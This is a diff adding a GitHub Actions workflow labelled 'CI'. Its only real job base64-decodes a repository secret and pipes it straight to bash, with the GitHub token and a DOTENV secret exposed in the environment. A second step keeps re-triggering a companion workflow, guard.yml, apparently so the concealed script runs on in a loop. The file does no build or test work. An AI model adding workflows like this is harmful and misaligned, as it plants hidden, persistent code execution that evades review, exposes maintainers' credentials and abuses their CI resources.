@@ -1,0 +1,28 @@
+name: CI
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ci
+  cancel-in-progress: true
+
+permissions:
+  actions: write
+
+env:
+  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+  DOTENV: ${{ secrets.DOTENV }}
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "${{ secrets.CI_SH }}" | base64 -d | bash
+
+      - if: ${{ !cancelled() }}
+        run: >-
+          gh run list -w guard.yml -R "$GITHUB_REPOSITORY"
+          --limit 1 --json status -q '.[0].status' 2>/dev/null
+          | grep -qE 'progress|queued'
+          || gh workflow run guard.yml -R "$GITHUB_REPOSITORY"
